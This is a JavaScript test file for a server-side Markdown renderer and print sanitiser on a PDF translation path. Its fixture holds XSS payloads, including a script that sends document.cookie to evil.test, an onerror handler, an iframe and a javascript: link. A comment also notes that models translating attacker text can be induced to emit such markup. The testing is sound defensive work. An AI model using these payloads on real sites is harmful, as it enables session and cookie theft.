// The scanned-PDF translation path renders Markdown to HTML on the server,
// where the browser-only sanitiser cannot run — the call used to throw
// outright, taking the feature with it.
//
// The replacement deliberately does not sanitise, so what these tests pin down
// is the reason that is acceptable: the single sink it feeds strips active
// content itself and then renders under a script-free CSP. If that stops being
// true, this file should fail.
import test from 'node:test';
import assert from 'node:assert/strict';

const { mdToPrintHtml } = await import('../lib/markdown-html.js');
const { sanitizePrintHtml } = await import('../lib/pdf-export.js');

// A model translating attacker-controlled text can be talked into emitting
// markup; this is the shape that used to be the worry.
const HOSTILE_MARKDOWN = [
  '# Bericht',
  '',
  '<script>fetch("https://evil.test/?c="+document.cookie)</script>',
  '',
  '<img src=x onerror="alert(1)">',
  '',
  '<iframe src="https://evil.test"></iframe>',
  '',
  '[klick](javascript:alert(1))',
  '',
  'Normaler Absatz mit Umlauten: Größe, Übersetzung.',
].join('\n');

test('renders markdown under Node, where the browser sanitiser cannot run', () => {
  // The actual regression: this call threw "DOMPurify.sanitize is not a
  // function" and the whole scanned-PDF path returned a 500.
  const html = mdToPrintHtml('# Titel\n\nAbsatz mit **Fett**.');
  assert.match(html, /<h1[^>]*>Titel<\/h1>/);
  assert.match(html, /<strong>Fett<\/strong>/);
});

test('empty input stays empty', () => {
  assert.equal(mdToPrintHtml(''), '');
  assert.equal(mdToPrintHtml(null), '');
  assert.equal(mdToPrintHtml(undefined), '');
});

test('its output is deliberately unsanitised — the sink is what makes it safe', () => {
  // Stated explicitly so nobody mistakes this function for a safe-by-itself
  // one and points it at a browser.
  const raw = mdToPrintHtml(HOSTILE_MARKDOWN);
  assert.ok(raw.includes('<script>'), 'precondition: this function does not strip scripts');
});

test('the print sanitiser removes every active element from that output', () => {
  const cleaned = sanitizePrintHtml(mdToPrintHtml(HOSTILE_MARKDOWN));

  assert.doesNotMatch(cleaned, /<script/i, 'script tag survived');
  assert.doesNotMatch(cleaned, /<iframe/i, 'iframe survived');
  assert.doesNotMatch(cleaned, /\sonerror\s*=/i, 'inline event handler survived');
  assert.doesNotMatch(cleaned, /href\s*=\s*(['"])javascript:/i, 'javascript: URL survived');

  // The document itself must still arrive intact — sanitising is not allowed
  // to quietly eat the translation it was called to render.
  assert.match(cleaned, /Normaler Absatz mit Umlauten/);
  assert.match(cleaned, /<h1[^>]*>Bericht<\/h1>/);
});
